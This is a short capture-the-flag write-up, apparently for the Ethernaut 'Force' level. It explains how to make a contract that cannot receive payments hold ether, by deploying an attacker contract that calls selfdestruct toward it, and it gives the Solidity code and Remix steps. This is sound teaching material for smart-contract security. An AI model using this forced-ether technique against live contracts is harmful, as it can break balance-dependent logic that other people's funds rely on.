# Challenge 7

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Challenge
---
> Some contracts will simply not take your money ¯\_(ツ)_/¯

  The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

  - Fallback methods
  - Sometimes the best way to attack a contract is with another contract.

Solution 
---
1. `selfdestruct` - get all the contracts ethers and send i to the designated address.

2. Hope in the Remix and paste your instance address from the terminal and paste it into the `At Address`. now you will see contract.

3. Create new Contract Here's The code ⬇️
```solidity
contract ForceAttack {
    Force forceAddress;

    constructor(address _addr) public {
        forceAddress = Force(_addr);
    }

    // destroy the contract and send all the ether amount to force contract
     function sendEther() public payable {
         require(msg.value > 0);
         selfdestruct(payable(address(forceAddress)));
     }   

     receive() external payable{}

     fallback() external payable{}
}
```

get the Force Contract address and Add it to the Deploy input box and Deploy, Send 1 wei (enough for our solution) you will see Force Contracts received 1 wei amount into the contract. submit the instance your challenge will be cleared. 🎉